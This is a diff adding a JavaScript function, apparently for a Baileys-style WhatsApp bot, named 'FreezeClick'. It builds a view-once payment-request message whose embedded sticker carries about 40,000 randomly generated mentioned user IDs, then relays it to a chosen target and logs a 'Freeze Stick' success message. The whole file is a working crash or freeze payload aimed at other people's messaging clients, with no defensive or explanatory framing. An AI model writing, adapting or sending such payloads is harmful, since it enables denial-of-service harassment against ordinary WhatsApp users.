@@ -1,0 +1,47 @@
+async function FreezeClick(client, target) {
+    const msg = await generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          requestPaymentMessage: {
+   currencyCodeIso4217: "IDR",
+   amount1000: "9999",
+   requestFrom: target,
+   noteMessage: {
+   stickerMessage: {
+   url: "https://mmg.whatsapp.net/v/t62.15575-24/40815542_298023669404967_8137288930098163097_n.enc?ccb=11-4&oh=01_AdRNKabVlg9bYx3c0mksyhR-u9c5BG7-b3x1eCDYbFA65w&oe=64EF511A&mms3=true",
+   fileSha256: "00zdVwDOfk+RHOI9HVRRc43lHGjR8ZO8x7OdErfi4nI=",
+   fileEncSha256: "6tOTA5Tw72yHYqOl5pWFJcsbnhzwurpR+H4g6dG6SMA=",
+   mediaKey: "+7Meau1x8pPYraSCKEm6UpL2vUwFaD2WLVpzAVdOmK0=",
+   mimetype: "image/webp",
+   height: 440,
+   width: 440,
+   directPath: "/v/t62.15575-24/40815542_298023669404967_8137288930098163097_n.enc?ccb=11-4&oh=01_AdRNKabVlg9bYx3c0mksyhR-u9c5BG7-b3x1eCDYbFA65w&oe=64EF511A",
+   mediaKeyTimestamp: "1690753283",
+   isAnimated: false,
+   stickerSentTs: "1690927831000",
+   isAvatar: false,
+   contextInfo: {
+            mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+            participant: target,
+            remoteJid: "status@broadcast",
+            forwardedNewsletterMessageInfo: {
+            newsletterJid: "120363399156154222@newsletter",
+            serverMessageId: 1,
+            newsletterName: "🧪⃰Ꮡ‌‌ΜƱLZλ CONCƱΣЯЯOR ⛧",
+            accessibilityText: "Fuck Beta 2025 - MulzyShiro"
+            },
+            businessMessageForwardInfo: {
+            businessOwnerJid: target
+              }}
+    }}
+   }}
+      }
+    }, {});
+
+    await client.relayMessage(target, msg.message, {
+    participant: { jid: target },
+    messageId: msg.key.id
+  });
+  console.log(chalk.green(`Successfully Send ${chalk.red("Freeze Stick")} to ${target}`))
+}
+
